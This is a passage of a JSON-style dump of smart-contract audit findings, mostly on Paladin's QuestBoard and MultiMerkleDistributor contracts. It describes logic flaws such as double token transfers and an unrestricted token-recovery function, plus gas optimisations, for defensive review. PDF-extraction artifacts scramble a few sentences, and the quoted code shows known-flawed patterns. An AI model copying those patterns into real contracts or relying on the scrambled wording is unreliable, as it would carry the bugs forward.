"https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf", "body": "Some events parameters are missing the indexed keyword. Indexing specific parameters is partic- ularly important to later be able to filter those events both in dApps or monitoring tools.  coverageFund event parameter should be declared as indexed in event SetCoverageFund.  Both oldDelegatee and newDelegatee should be indexed in event DelegatedVestingEscrow.  donator should be declared as indexed in event Donate.", "labels": ["Spearbit", "LiquidCollective2", "Severity: Informational"]}, {"title": "Add natspec documentation to the TLC contract", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf", "body": "The current implementation of TLC contract is missing natspec at the root level to explain the contract. The natspec should cover the basic explanation of the contract (like it has already been done in other contracts like River.sol) but also illustrate  TLC token has a fixed max supply that is minted at deploy time.  All the minted tokens are sent to a single account at deploy time.  How TLC token will be distributed.  How voting power works (you have to delegate to yourself to gain voting power).  How the vesting process works.  Other general information useful for the user/investor that receives the TLC token directly or vested.", "labels": ["Spearbit", "LiquidCollective2", "Severity: Informational"]}, {"title": "Verify user has indeed voted", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "If an error is made in the merkle trees (either by accident or on purpose) a user that did not vote (in that period for that gauge) might get rewards assigned to him. Although the Paladin documentation says: \"the Curve DAO contract does not offer a mapping of votes for each Gauge for each Period\", it might still be possible to verify that a user has voted if the account, gauge and period are known. Note: Set to high risk because the likelihood of this happening is medium, but the impact is high.", "labels": ["Spearbit", "Paladin", "Severity: High Risk"]}, {"title": "Tokens could be sent / withdrawn multiple times by accident", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "Functions closeQuestPeriod() and closePartOfQuestPeriod() have similar functionality but in- terfere with each other. 1. Suppose you have closed the first quest of a period via closePartOfQuestPeriod(). Now you cannot use closeQuestPeriod() to close the rest of the periods, as closeQuestPeriod() checks the state of the first quest. 2. Suppose you have closed the second quest of a period via closePartOfQuestPeriod(), but closeQuest- Period() continues to work. It will close the second quest again and send the rewards of the second quest to the distributor, again. Also, function closeQuestPeriod() sets the withdrawableAmount value one more time, so the creator can do withdrawUnusedRewards() once more. Although both closeQuestPeriod() and closePartOfQuestPeriod() are authorized, the problems above could occur by accident. Additionally there is a lot of code duplication between closeQuestPeriod() and closePartOfQuestPeriod(), with a high risk of issues with future code changes. 5 function closeQuestPeriod(uint256 period) external isAlive onlyAllowed nonReentrant { ... // We use the 1st QuestPeriod of this period to check it was not Closed uint256[] memory questsForPeriod = questsByPeriod[period]; require( ,! periodsByQuest[questsForPeriod[0]][period].currentState == PeriodState.ACTIVE, // only checks first period \"QuestBoard: Period already closed\" ); ... // no further checks on currentState _questPeriod.withdrawableAmount = .... IERC20(_quest.rewardToken).safeTransfer(distributor, toDistributeAmount); // sends tokens (again) ... } // sets withdrawableAmount (again) function closePartOfQuestPeriod(uint256 period, uint256[] calldata questIDs) external isAlive onlyAllowed nonReentrant { ,! ... _questPeriod.currentState = PeriodState.CLOSED; ... _questPeriod.withdrawableAmount = _questPeriod.rewardAmountPerPeriod - toDistributeAmount; IERC20(_quest.rewardToken).safeTransfer(distributor, toDistributeAmount); ... } Note: Set to high risk because the likelihood of this happening is medium, but the impact is high.", "labels": ["Spearbit", "Paladin", "Severity: High Risk"]}, {"title": "Limit possibilities of recoverERC20()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "Function recoverERC20() in contract MultiMerkleDistributor.sol allows the retrieval of all ERC20 tokens from the MultiMerkleDistributor.sol whereas the comment indicates it is only meant to retrieve those tokens that have been sent by mistake. Allowing to retrieve all tokens also enables the retrieval of legitimate ones. This way rewards cannot be collected anymore. It could be seen as allowing a rug pull by the project and should be avoided. In contrast, function recoverERC20() in contract QuestBoard.sol does prevent whitelisted tokens from being re- trieved. Note: The project could also add a merkle tree that allows for the retrieval of legitimate tokens to their own addresses. 6 * @notice Recovers ERC2O tokens sent by mistake to the contract contract MultiMerkleDistributor is Ownable { function recoverERC20(address token, uint256 amount) external onlyOwner returns(bool) { IERC20(token).safeTransfer(owner(), amount); return true; } } contract QuestBoard is Ownable, ReentrancyGuard { function recoverERC20(address token, uint256 amount) external onlyOwner returns(bool) { require(!whitelistedTokens[token], \"QuestBoard: Cannot recover whitelisted token\"); IERC20(token).safeTransfer(owner(), amount); return true; } }", "labels": ["Spearbit", "Paladin", "Severity: Medium Risk"]}, {"title": "Updating QuestBoard in MultiMerkleDistributor.sol will not work", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "Updating QuestManager/ QuestBoard in MultiMerkleDistributor.sol will give the following issue: If the newQuestBoard uses the current implementation of QuestBoard.sol, it will start with questId == 0 again, thus attempting to overwrite previous quests. function updateQuestManager(address newQuestBoard) external onlyOwner { questBoard = newQuestBoard; }", "labels": ["Spearbit", "Paladin", "Severity: Medium Risk"]}, {"title": "Old quests can be extended via increaseQuestDuration()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "Function increaseQuestDuration() does not check if a quest is already in the past. Extending a quest from the past in duration is probably not useful. It also might require additional calls to closePartOfQuest- Period(). function increaseQuestDuration(...) ... { updatePeriod(); ... uint256 lastPeriod = questPeriods[questID][questPeriods[questID].length - 1]; ... uint256 periodIterator = ((lastPeriod + WEEK) / WEEK) * WEEK; ... for(uint256 i = 0; i < addedDuration;){ ... periodsByQuest[questID][periodIterator]....= ... periodIterator = ((periodIterator + WEEK) / WEEK) * WEEK; unchecked{ ++i; } } ... }", "labels": ["Spearbit", "Paladin", "Severity: Medium Risk"]}, {"title": "Accidental call of addQuest could block contracts", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "The addQuest() function uses an onlyAllowed access control modifier. This modifier checks if msg.sender is questBoard or owner. However, the QuestBoard.sol contract has a QuestID registration and a token whitelisting mechanism which should be used in combination with addQuest() function. If owner accidentally calls addQuest(), the QuestBoard.sol contract will not be able to call addQuest() for that questID. As soon as createQuest() tries to add that same questID the function will revert, becoming uncallable because nextID still maintains that same value. function createQuest(...) ... { ... uint256 newQuestID = nextID; nextID += 1; ... require(MultiMerkleDistributor(distributor).addQuest(newQuestID, rewardToken), \"QuestBoard: Fail add to Distributor\"); ... ,! } 8 function addQuest(uint256 questID, address token) external onlyAllowed returns(bool) { require(questRewardToken[questID] == address(0), \"MultiMerkle: Quest already listed\"); require(token != address(0), \"MultiMerkle: Incorrect reward token\"); // Add a new Quest using the QuestID, and list the reward token for that Quest questRewardToken[questID] = token; emit NewQuest(questID, token); return true; } Note: Set to medium risk because the likelihood of this happening is low, but the impact is high.", "labels": ["Spearbit", "Paladin", "Severity: Medium Risk"]}, {"title": "Reduce impact of emergencyUpdatequestPeriod()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "Function emergencyUpdatequestPeriod() allows the merkle tree to be updated. The merkle tree contains an embedded index parameter which is used to prevent double claims. When the merkleRoot is updated, the layout of indexes in the merkle tree could become different. Example: Suppose the initial merkle tree contains information for: - user A: index=1, account = 0x1234, amount=100 - user B: index=2, account = 0x5689, amount=200 Then user A claims => _setClaimed(..., 1) is set. Now it turns out a mistake is made with the merkle tree, and it should contain: - user B: index=1, account = 0x5689, amount=200 - user C: index=2, account = 0xabcd, amount=300 Now user B will not be able to claim because bit 1 has already been set. Under this situation the following issues can occur:  Someone who has already claimed might be able to claim again.  Someone who has already claimed has too much.  Someone who has already claimed has too little, and cannot longer claim the rest because _setClaimed() has already been set.  someone who has not yet claimed might not be able to claim because _setClaimed() has already been set by another user. Note: Set to medium risk because the likelihood of this happening is low, but the impact is high.", "labels": ["Spearbit", "Paladin", "Severity: Medium Risk"]}, {"title": "Verify the correct merkle tree is used", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "The MultiMerkleDistributor.sol contract does not verify that the merkle tree belongs to the right quest and period. If the wrong merkle tree is added then the wrong rewards can be claimed. Note: Set to medium risk because the likelihood of this happening is low, but the impact is high.", "labels": ["Spearbit", "Paladin", "Severity: Medium Risk"]}, {"title": "Prevent mixing rewards from different quests and periods", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "The MultiMerkleDistributor.sol contract does not verify that the sum of all amounts in the merkle tree are equal to the rewards allocated for that quest and for that period. This could happen if there is a bug in the merkle tree creation script. If the sum of the amounts is too high, then tokens from other quests or other periods could be claimed, which will give problems later on, when claims are done for the other quest/periods. Note: Set to medium risk because the likelihood of this happening is low, but the impact is high.", "labels": ["Spearbit", "Paladin", "Severity: Medium Risk"]}, {"title": "Nonexistent zero address check for newQuestBoard in updateQuestManager function", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "Nonexistent zero address check for newQuestBoard in updateQuestManager function. Assigning newQuestBoard to a zero address may cause unintended behavior.", "labels": ["Spearbit", "Paladin", "Severity: Low Risk"]}, {"title": "Verify period is always a multiple of week", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "The calculations with period assume that period is a multiple of WEEK. However, period is often assigned as a parameter and not verified if it is a multiple of WEEK. This calculation may cause unexpected results. Note: When it is verified that period is a multiple of WEEK, the following calculation can be simplified: - int256 nextPeriod = ((period + WEEK) / WEEK) * WEEK; + int256 nextPeriod = period + WEEK; The following function does not explicitly verify that period is a multiple of WEEK. function closeQuestPeriod(uint256 period) external isAlive onlyAllowed nonReentrant { ... uint256 nextPeriod = ((period + WEEK) / WEEK) * WEEK; ... } function getQuestIdsForPeriod(uint256 period) external view returns(uint256[] memory) { ... } function closePartOfQuestPeriod(uint256 period, uint256[] calldata questIDs) ... { ... } function addMerkleRoot(uint256 questID, uint256 period, bytes32 merkleRoot) ... { ... } function addMultipleMerkleRoot(..., uint256 period, ...) external isAlive onlyAllowed nonReentrant { ... } ,! function claim(..., uint256 period, ...) public { ... } function updateQuestPeriod(uint256 questID, uint256 period, bytes32 merkleRoot) ... { ... } function emergencyUpdatequestPeriod(uint256 questID, uint256 period, bytes32 merkleRoot) ... { ... } function claimQuest(address account, uint256 questID, ClaimParams[] calldata claims) external { ,! ... // also uses period as part of the claims array require(questMerkleRootPerPeriod[claims[i].questID][claims[i].period] != 0, \"MultiMerkle: not updated yet\"); require(!isClaimed(questID, claims[i].period, claims[i].index), \"MultiMerkle: already claimed\"); ... require( MerkleProof.verify(claims[i].merkleProof, questMerkleRootPerPeriod[questID][claims[i].period], ,! node), \"MultiMerkle: Invalid proof\" ); ... _setClaimed(questID, claims[i].period, claims[i].index); ... emit Claimed(questID, claims[i].period, claims[i].index, claims[i].amount, rewardToken, account); ... }", "labels": ["Spearbit", "Paladin", "Severity: Low Risk QuestBoard.sol#L201-L203, QuestBoard.sol#L750-L815,"]}, {"title": "Missing safety check to ensure array length does not underflow and revert", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "Several functions use questPeriods[questID][questPeriods[questID].length - 1]. The sec- ond value in the questPeriods mapping is questPeriods[questID].length - 1. It is possible for this function to revert if the case arises where questPeriods[questID].length is 0. Looking at the code this is not likely to occur but it is a valid safety check that covers possible strange edge cases. function _getRemainingDuration(uint256 questID) internal view returns(uint256) { ... uint256 lastPeriod = questPeriods[questID][questPeriods[questID].length - 1]; ... } function increaseQuestDuration(...) ... { ... uint256 lastPeriod = questPeriods[questID][questPeriods[questID].length - 1]; ... } function increaseQuestReward(...) ... { ... uint256 lastPeriod = questPeriods[questID][questPeriods[questID].length - 1]; ... } function increaseQuestObjective(... ) ... { ... uint256 lastPeriod = questPeriods[questID][questPeriods[questID].length - 1]; ... }", "labels": ["Spearbit", "Paladin", "Severity: Low Risk"]}, {"title": "Prevent dual entry point tokens", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "Function recoverERC20() in contract QuestBoard.sol only allows the retrieval of non whitelisted tokens. Recently an issue has been found to circumvent these checks, with so called dual entry point tokens. See a description here: compound-tusd-integration-issue-retrospective function recoverERC20(address token, uint256 amount) external onlyOwner returns(bool) { require(!whitelistedTokens[token], \"QuestBoard: Cannot recover whitelisted token\"); IERC20(token).safeTransfer(owner(), amount); return true; } 13", "labels": ["Spearbit", "Paladin", "Severity: Low Risk"]}, {"title": "Limit the creation of quests", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "The function getQuestIdsForPeriod() could run out of gas if someone creates an enormous amount of quests. See also: what-is-the-array-size-limit-of-a-returned-array. Note: If this were to happen, the QuestIds can also be retrieved directly from the getter of questsByPeriod(). Note: closeQuestPeriod() has the same problem, but closePartOfQuestPeriod() is a workaround for this. Requiring a minimal amount of tokens to create a quest can limit the number of quests. The minimum number of tokens to pay is: duration * minObjective * minRewardPerVotePerToken[]. The values of duration and minObjective are least 1, but minRewardPerVotePerToken[] could be 0 and even if minRewardPerVotePerToken is non zero but still low, the number of tokes required is neglectable when using tokens with 18 decimals. Requiring a minimum amount of tokens also helps to prevent the creation of spam quests. 14 function getQuestIdsForPeriod(uint256 period) external view returns(uint256[] memory) { return questsByPeriod[period]; // could run out of gas } function createQuest(...) { ... require(duration > 0, \"QuestBoard: Incorrect duration\"); require(objective >= minObjective, \"QuestBoard: Objective too low\"); ... require(rewardPerVote >= minRewardPerVotePerToken[rewardToken], \"QuestBoard: RewardPerVote too low\"); ... vars.rewardPerPeriod = (objective * rewardPerVote) / UNIT; // can be 0 ==> totalRewardAmount can be 0 require((totalRewardAmount * platformFee)/MAX_BPS == feeAmount, \"QuestBoard: feeAmount incorrect\"); // feeAmount can be 0 ... require((vars.rewardPerPeriod * duration) == totalRewardAmount, \"QuestBoard: totalRewardAmount incorrect\"); ... IERC20(rewardToken).safeTransferFrom(vars.creator, address(this), totalRewardAmount); IERC20(rewardToken).safeTransferFrom(vars.creator, questChest, feeAmount); ... ,! ,! ,! ,! } constructor(address _gaugeController, address _chest){ ... minObjective = 1000 * UNIT; // initial value, but can be overwritten ... } function updateMinObjective(uint256 newMinObjective) external onlyOwner { require(newMinObjective > 0, \"QuestBoard: Null value\"); // perhaps set higher minObjective = newMinObjective; } function whitelistToken(address newToken, uint256 minRewardPerVote) public onlyAllowed { // geen isAlive??? ... minRewardPerVotePerToken[newToken] = minRewardPerVote; // no minimum value required ... ,! }", "labels": ["Spearbit", "Paladin", "Severity: Low Risk"]}, {"title": "Non existing states are considered active", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "periods- if a state is checked of a non existing However, ByQuest[questIDs[i]][period] is active. questIDs[i] or a questID that has no quest in that period, then periodsByQuest[questIDs[i]][period] is empty and periodsByQuest[questIDs[i]][period].currentState == 0. closePartOfQuestPeriod() function verifies state the of if As PeriodState.ACTIVE ==0, the stated is considered to be active and the require() doesnt trigger and pro- cessing continues. Luckily as all other values are also 0 (especially _questPeriod.rewardAmountPerPeriod), toDistributeAmount will be 0 and no tokens are sent. However slight future changes in the code might introduce unwanted effects. enum PeriodState { ACTIVE, CLOSED, DISTRIBUTED } // ACTIVE == 0 function closePartOfQuestPeriod(uint256 period, uint256[] calldata questIDs) external isAlive ,! onlyAllowed nonReentrant { ... for(uint256 i = 0; i < length;){ ... require( periodsByQuest[questIDs[i]][period].currentState == PeriodState.ACTIVE, // doesn't work ,! if questIDs[i] & period are empty \"QuestBoard: Period already closed\" );", "labels": ["Spearbit", "Paladin", "Severity: Low Risk"]}, {"title": "Critical changes should use two-step process", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "The QuestBoard.sol, QuestTreasureChest.sol and QuestTreasureChest.sol contracts inherit from OpenZeppelins Ownable contract which enables the onlyOwner role to transfer ownership to another address. Its possible that the onlyOwner role mistakenly transfers ownership to the wrong address, resulting in a loss of the onlyOwner role. This is an unwanted situation because the owner role is neccesary for several methods.", "labels": ["Spearbit", "Paladin", "Severity: Low Risk"]}, {"title": "Prevent accidental call of emergencyUpdatequestPeriod()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "Functions updateQuestPeriod() and emergencyUpdatequestPeriod() are very similar. However, if function emergencyUpdatequestPeriod() is accidentally used instead of updateQuestPeriod(), then period isnt push()ed to the array questClosedPeriods[]. This means function getClosedPeriodsByQuests() will not be able to retreive all the closed periods. function updateQuestPeriod(uint256 questID, uint256 period, bytes32 merkleRoot) external onlyAllowed returns(bool) { ... questClosedPeriods[questID].push(period); ... questMerkleRootPerPeriod[questID][period] = merkleRoot; ... ,! } function emergencyUpdatequestPeriod(uint256 questID, uint256 period, bytes32 merkleRoot) external onlyOwner returns(bool) { ... // no push() questMerkleRootPerPeriod[questID][period] = merkleRoot; ... ,! }", "labels": ["Spearbit", "Paladin", "Severity: Low Risk"]}, {"title": "Usage of deprecated safeApprove", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "OpenZeppelin safeApprove implementation is deprecated. Reference. Using this deprecated func- tion can lead to unintended reverts and potential locking of funds. SafeERC20.safeApprove() Insecure Behaviour.", "labels": ["Spearbit", "Paladin", "Severity: Low Risk"]}, {"title": "questID on the NewQuest event should be indexed", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "The NewQuest event currently does not have questID set to indexed which goes against the pattern set by the other events in the contract where questID is actually indexed.", "labels": ["Spearbit", "Paladin", "Severity: Low Risk"]}, {"title": "Add validation checks on addresses", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "Missing validation checks on addresses passed into the constructor functions. Adding these checks on _gaugeController and _chest can prevent costly errors the during deployment of the contract. Also in function claim() and claimQuest() there is no zero check for for account argument.", "labels": ["Spearbit", "Paladin", "Severity: Low Risk"]}, {"title": "Changing public constant variables to non-public can save gas", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "Several constants are public and thus have a getter function. called from the outside, therefore it is not necessary to make them public. It is unlikely for these values to be", "labels": ["Spearbit", "Paladin", "Severity: Gas Optimization"]}, {"title": "Using uint instead of bool to optimize gas usage", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "A bool is more costly than uint256. Because each write action generates an additional SLOAD to read the contents of the slot, change the bits occupied by bool and finally write back. contract BooleanTest { mapping(address => bool) approvedManagers; // Gas Cost : 44144 function approveManager(address newManager) external{ approvedManagers[newManager] = true; } mapping(address => uint256) approvedManagersWithoutBoolean; // Gas Cost : 44069 function approveManagerWithoutBoolean(address newManager) external{ approvedManagersWithoutBoolean[newManager] = 1; } }", "labels": ["Spearbit", "Paladin", "Severity: Gas Optimization"]}, {"title": "Optimize && operator usage", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "The check && consumes more gas than using multiple require statements. Example test can be seen below: //Gas Cost: 22515 function increaseQuestReward(uint256 newRewardPerVote, uint256 addedRewardAmount, uint256 feeAmount) ,! public { require(newRewardPerVote != 0 && addedRewardAmount != 0 && feeAmount != 0, \"QuestBoard: Null ,! amount\"); } //Gas Cost: 22477 function increaseQuestRewardTest(uint256 newRewardPerVote, uint256 addedRewardAmount, uint256 ,! feeAmount) public { require(newRewardPerVote != 0, \"QuestBoard: Null amount\"); require(addedRewardAmount != 0, \"QuestBoard: Null amount\"); require(feeAmount != 0, \"QuestBoard: Null amount\"); } Note : It costs more gas to deploy but it is worth it after X calls. Trade-offs should be considered.", "labels": ["Spearbit", "Paladin", "Severity: Gas Optimization"]}, {"title": "Unnecesary value set to 0", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "Since all default values in solidity are already 0 it riod.rewardAmountDistributed = 0; here as it should already be 0. is unnecessary to include _questPe-", "labels": ["Spearbit", "Paladin", "Severity: Gas Optimization"]}, {"title": "Optimize unsigned integer comparison", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "Check != 0 costs less gas compared to > 0 for unsigned integers in require statements with the optimizer enabled. While it may seem that > 0 is cheaper than !=0 this is only true without the optimizer being enabled and outside a require statement. If the optimizer is enabled at 10k and it is in a require statement, it would be more gas efficient.", "labels": ["Spearbit", "Paladin", "Severity: Gas Optimization"]}, {"title": "Use memory instead of storage in closeQuestPeriod() and closePartOfQuestPeriod()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "In functions closeQuestPeriod() and closePartOfQuestPeriod() a storage pointer _quest is set to quests[questsForPeriod[i]]. This is normally used when write access to the location is need. Nevertheless _quest is read only, to a copy of quests[questsForPeriod[i]] is also sufficient. This can save some gas. function closeQuestPeriod(uint256 period) external isAlive onlyAllowed nonReentrant { ... Quest storage _quest = quests[questsForPeriod[i]]; ... gaugeController.checkpoint_gauge(_quest.gauge); // read only access of _quest ... uint256 periodBias = gaugeController.points_weight(_quest.gauge, nextPeriod).bias; // read only access of _quest ... IERC20(_quest.rewardToken).safeTransfer(distributor, toDistributeAmount); // read only access of _quest ... ,! ,! } function closePartOfQuestPeriod(uint256 period, uint256[] calldata questIDs) external isAlive onlyAllowed nonReentrant { ... Quest storage _quest = quests[questIDs[i]]; ... gaugeController.checkpoint_gauge(_quest.gauge); // read only access of _quest ... uint256 periodBias = gaugeController.points_weight(_quest.gauge, nextPeriod).bias; // read only access of _quest ... IERC20(_quest.rewardToken).safeTransfer(distributor, toDistributeAmount); // read only access of _quest ... ,! ,! ,! }", "labels": ["Spearbit", "Paladin", "Severity: Gas Optimization"]}, {"title": "Revert string size optimization", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "Shortening revert strings to fit in 32 bytes will decrease deploy time gas and will decrease runtime gas when the revert condition has been met. Revert strings using more than 32 bytes require at least one additional mstore, along with additional operations for computing memory offset.", "labels": ["Spearbit", "Paladin", "Severity: Gas Optimization"]}, {"title": "Optimize withdrawUnusedRewards() and emergencyWithdraw() with pointers", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "ByQuest[questID][_questPeriods[i]] several times. pointer to read and update values. This will save gas and also make the code more readable. periods- It is possible to set a pointer to this record and use that withdrawUnusedRewards() emergencyWithdraw() Functions and use function withdrawUnusedRewards(uint256 questID, address recipient) external isAlive nonReentrant { ... if(periodsByQuest[questID][_questPeriods[i]].currentState == PeriodState.ACTIVE) { ... } ... uint256 withdrawableForPeriod = periodsByQuest[questID][_questPeriods[i]].withdrawableAmount; ... if(withdrawableForPeriod > 0){ ... periodsByQuest[questID][_questPeriods[i]].withdrawableAmount = 0; } ... } function emergencyWithdraw(uint256 questID, address recipient) external nonReentrant { ... if(periodsByQuest[questID][_questPeriods[i]].currentState != PeriodState.ACTIVE){ uint256 withdrawableForPeriod = periodsByQuest[questID][_questPeriods[i]].withdrawableAmount; ... if(withdrawableForPeriod > 0){ ... periodsByQuest[questID][_questPeriods[i]].withdrawableAmount = 0; } } else { .. totalWithdraw += periodsByQuest[questID][_questPeriods[i]].rewardAmountPerPeriod; periodsByQuest[questID][_questPeriods[i]].rewardAmountPerPeriod = 0; } ... }", "labels": ["Spearbit", "Paladin", "Severity: Gas Optimization"]}, {"title": "Needless to initialize variables with default values", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "uint256 variables are initialized to a default value of 0 per Solidity docs. Setting a variable to the default value is unnecessary.", "labels": ["Spearbit", "Paladin", "Severity: Gas Optimization"]}, {"title": "Optimize the calculation of the currentPeriod", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "The retrieval of currentPeriod is relatively gas expensive because it requires an SLOAD instruction (100 gas) every time. Calculating (block.timestamp / WEEK) * WEEK; is cheaper (TIMESTAMP: 2 gas, MUL: 5 gas, DIV: 5 gas). Refer to evm.codes for more information. Additionally, there is a risk that the call to updatePeriod() is forgotten although it does not happen in the current code. function updatePeriod() public { if (block.timestamp >= currentPeriod + WEEK) { currentPeriod = (block.timestamp / WEEK) * WEEK; } } Note: it is also possible to do all calculations with (block.timestamp / WEEK) instead of (block.timestamp / WEEK) * WEEK, but as the Paladin project has indicated:\"\" This currentPeriod is a timestamp, showing the start date of the current period, and based from the Curve system (because we want the same timestamp they have in the GaugeController).\"", "labels": ["Spearbit", "Paladin", "Severity: Gas Optimization"]}, {"title": "Change memory to calldata", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "For the function parameters, it is often more optimal to have the reference location to be calldata instead of memory. Changing bytes to calldata will decrease gas usage. OpenZeppelin Pull Request", "labels": ["Spearbit", "Paladin", "Severity: Gas Optimization"]}, {"title": "Caching array length at the beginning of function can save gas", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "Caching array length at the beginning of the function can save gas in the several locations. function multiClaim(address account, ClaimParams[] calldata claims) external { require(claims.length != 0, \"MultiMerkle: empty parameters\"); uint256 length = claims.length; // if this is done before the require, the require can use \"length\" ... }", "labels": ["Spearbit", "Paladin", "Severity: Gas Optimization"]}, {"title": "Check amount is greater than 0 to avoid calling safeTransfer() unnecessarily", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "A check should be added to make sure amount is greater than 0 to avoid calling safeTransfer() unnecessarily.", "labels": ["Spearbit", "Paladin", "Severity: Gas Optimization"]}, {"title": "Unchecked{++i} is more efficient than i++", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "The function getAllQuestPeriodsForQuestId uses i++ which costs more gas than ++i, especially in a loop. Also, the createQuest function uses nextID += 1 which costs more gas than ++nextID. Finally the initialization of i = 0 can be skipped, as 0 is the default value.", "labels": ["Spearbit", "Paladin", "Severity: Gas Optimization"]}, {"title": "Could replace claims[i].questID with questID", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "Could replace claims[i].questID with questID (as they are equal due to the check above)", "labels": ["Spearbit", "Paladin", "Severity: Gas Optimization"]}, {"title": "Change function visibility from public to external", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "The function updateRewardToken of the QuestBoard contract could be set external to save gas and improve code quality.", "labels": ["Spearbit", "Paladin", "Severity: Gas Optimization"]}, {"title": "Functions isClaimed() and _setClaimed() can be optimized", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "The functions isClaimed() and _setClaimed() of the contract MultiMerkleDistributor can be optimized to save gas. See OZ BitMaps for inspiration.", "labels": ["Spearbit", "Paladin", "Severity: Gas Optimization"]}, {"title": "Missing events for owner only functions", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "Several key actions are defined without event declarations. Owner only functions that change critical parameters can emit events to record these changes on-chain for off-chain monitors/tools/interfaces.", "labels": ["Spearbit", "Paladin", "Severity: Informational"]}, {"title": "Use nonReentrant modifier in a consistent way", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "The functions claim(), claimQuest() and recoverERC20() of contract MultiMerkleDistributor send tokens but dont have a nonReentrant modifier. All other functions that send tokens do have this modifier. Note: as the checks & effects patterns is used this is not really necessary. function claim(...) public { ... IERC20(rewardToken).safeTransfer(account, amount); } function claimQuest(...) external { ... IERC20(rewardToken).safeTransfer(account, totalClaimAmount); } function recoverERC20(address token, uint256 amount) external onlyOwner returns(bool) { IERC20(token).safeTransfer(owner(), amount); return true; }", "labels": ["Spearbit", "Paladin", "Severity: Informational"]}, {"title": "Place struct definition at the beginning of the contract", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "Regarding Solidity Style Guide, the struct definition can move to the beginning of the contract.", "labels": ["Spearbit", "Paladin", "Severity: Informational"]}, {"title": "Improve checks for past quests in increaseQuestReward() and increaseQuestObjective()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "The functions increaseQuestReward() and increaseQuestObjective() check: newRewardPerVote > periodsByQuest[questID][currentPeriod].rewardPerVote. This is true when the quest is in the past (e.g. currentPeriod is outside of the quest range), because all the values will be 0. Luckily execution is stopped at _getRemainingDuration(questID), however it would be more logical to put this check near the start of the function. function increaseQuestReward(...) ... { updatePeriod(); ... require(newRewardPerVote > periodsByQuest[questID][currentPeriod].rewardPerVote, \"QuestBoard: New reward must be higher\"); ... uint256 remainingDuration = _getRemainingDuration(questID); require(remainingDuration > 0, \"QuestBoard: no more incoming QuestPeriods\"); ... ,! } The function _getRemainingDuration() reverts when the quest is in the past, as currentPeriod will be larger than lastPeriod. The is not what you would expect from this function. function 